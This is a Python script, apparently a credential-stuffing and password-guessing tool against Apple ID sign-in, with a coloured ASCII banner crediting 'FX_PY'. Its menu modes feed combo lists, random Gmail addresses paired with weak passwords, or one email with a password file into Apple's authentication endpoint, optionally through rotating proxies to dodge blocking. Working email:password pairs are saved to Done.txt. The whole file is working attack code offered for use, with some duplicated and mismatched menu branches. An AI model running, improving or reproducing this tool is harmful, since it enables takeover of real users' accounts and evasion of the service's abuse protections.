import requests
import random
from time import sleep
Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # Whit

num=[5,6,7,8,9]
letters='qwertyuiopaadfghjklzxcvbnm'
email='email@domen.com'
password='pass##'
fail,success,attempt,Block,Prox=0,0,0,0,0
print(f'''
{Yellow}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎{Red}⢠⣇⠏⠀{Yellow}⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⠀⠠⣄⠸⢹⣦⠀⠀⡄⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢹⣦⢠⣼⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀
⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻⠀⠀
⠀⠀⠘⣰⣿⣿⡄⡆⠀⠀⠀⠳⣼⢦⡘⣄⠀⠀⡟⡷⠃⠘⢶⣿⡎⠻⣆⠀⠀
⠀⠀⠀⡟⡿⢿⡿⠀⠀⠀⠀⠀⠙⠀⠻⢯⢷⣼⠁⠁⠀⠀⠀⠙⢿⡄⡈⢆⠀
⠀⠀⠀⠀⡇⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⡇⢹⢿⡀
⠀⠀⠀⠀⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁

{White}1 •{Yellow} File Combo [Without Proxy]
{White}2 •{Yellow} File Combo [With Proxy File]

{White}3 •{Yellow} Random [Without Proxy]
{White}4 •{Yellow} Random [With Proxy File]

{White}6 •{Yellow} Email&File Pass [Without Proxy]
{White}7 •{Yellow} Email&File Pass [With Proxy File]


{Yellow}
By :{White}
TELEGRAM{Yellow} •{Red} FX_PY {White}
INSTAGRAM {Yellow}•{Red} FX_PY3

''')


try:
	Choose = int(input(f'{Yellow} •{White} Choose : '))	
except :
	print(f'{Yellow} •{White} Choose ! ')
	exit()
if Choose == 1:
	Combo_File=input(f'{Yellow} •{White} File Combo : ')
	print('\n')
	for combo in open(Combo_File,'r').read().splitlines():
		
		email=combo.split(':')[0]
		password=combo.split(':')[1]
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'\n{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')


elif Choose == 2:
	Proxy_File=input(f'{Yellow} •{White} Proxy File : ')
	Combo_File=input(f'{Yellow} •{White} File Combo : ')
	print('\n')
	for combo in open(Combo_File,'r').read().splitlines():
		Prox+=1
		email=combo.split(':')[0]
		password=combo.split(':')[1]
		try:
			Proxies=open(Proxy_File,'r').read().splitlines()[Prox]
		except :
			print(f'{White}[{Red}!{White}]{Yellow} •{White} Proxies are over')
			break
		
		Proxy={'http' : f'https://{Proxies}'}
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,proxies=Proxy,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')




if Choose == 3:
	
	print('\n')
	while True:
		nm=random.choice(num)
		email = ''.join(random.choice(letters) for i in range(nm))+'@gmail.com'
		
		Pass=['Aa12345##','Aa12345','qwert111']
		password=random.choice(Pass)
		
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')



if Choose == 4:
	Proxy_File=input('[+] • Proxy File : ')
	print('\n')
	while True:
		Prox+=1
		try:
			Proxies=open(Proxy_File,'r').read().splitlines()[Prox]
		except :
			print(f'{White}[{Red}!{White}]{Yellow} •{White} Proxies are over')
			break
		nm=random.choice(num)
		email = ''.join(random.choice(letters) for i in range(nm))+'@gmail.com'
		
		Pass=['Aa12345##','Aa12345','qwert111']
		password=random.choice(Pass)
		
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		Proxy={'http' : f'https://{Proxies}'}
		response = requests.post(url,headers=headers,json=data,proxies=Proxy)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')
		













if Choose == 5:
	email=input(f'{Yellow} •{White} Email : ')
	Pass_File=input(f'{Yellow} •{White} File Password : ')
	print('\n')
	for password in open(Pass_File,'r').read().splitlines():
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')


elif Choose == 2:
	Proxy_File=input(f'{Yellow} •{White} Proxy File : ')
	Combo_File=input(f'{Yellow} •{White} File Combo : ')
	print('\n')
	for combo in open(Combo_File,'r').read().splitlines():
		Prox+=1
		email=combo.split(':')[0]
		password=combo.split(':')[1]
		try:
			Proxies=open(Proxy_File,'r').read().splitlines()[Prox]
		except :
			print(f'{White}[{Red}!{White}]{Yellow} •{White} Proxies are over')
			break
		
		Proxy={'http' : f'https://{Proxies}'}
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,proxies=Proxy,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print('\n')
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')














if Choose == 6:
	email=input(f'{Yellow} •{White} Email : ')
	Pass_File=input(f'{Yellow} •{White} File Password : ')
	print('\n')
	for password in open(Pass_File,'r').read().splitlines():
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')













if Choose == 7:
	email=input(f'{Yellow} •{White} Email : ')
	Pass_File=input(f'{Yellow} •{White} File Password : ')
	Proxy_File=input(f'{Yellow} •{White} Proxy File : ')
	print('\n')
	for password in open(Pass_File,'r').read().splitlines():
		try:
			Proxies=open(Proxy_File,'r').read().splitlines()[Prox]
		except :
			print(f'{White}[{Red}!{White}]{Yellow} •{White} Proxies are over')
			break
		
		Proxy={'http' : f'https://{Proxies}'}
		url = 'https://idmsa.apple.com/appleauth/auth/signin'
		headers={"Accept": "application/json, text/javascript, */*; q=0.01",
		"User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0",
		"X-Apple-Locale":"QT-EN",
		"X-Apple-Trusted-Domain": "https://idmsa.apple.com",
		"Origin": "https://idmsa.apple.com",
		"X-Requested-With": "XMLHttpRequest"}
		data={"accountName":email,"rememberMe":"false","password":password}
		
		response = requests.post(url,headers=headers,json=data,allow_redirects=False,proxies=Proxy,timeout=6)
		
		if 'authType' in response.text:
			success+=1
			attempt+=1
			print()
			print('-'*40)
			print(f'{Yellow} •{Green} Success {White}{email}:{password}')
			open('Done.txt','a').write(email+':'+password+'\n')
			print('-'*40)
			print('\n')
		elif 'Visit iForgot' in response.text:
			Block+=1
			attempt+=1
		else:
			fail+=1
			attempt+=1
		print(f'\r[x] fail {fail} | [✓] success {success} | [!] Block {Block}',end='')
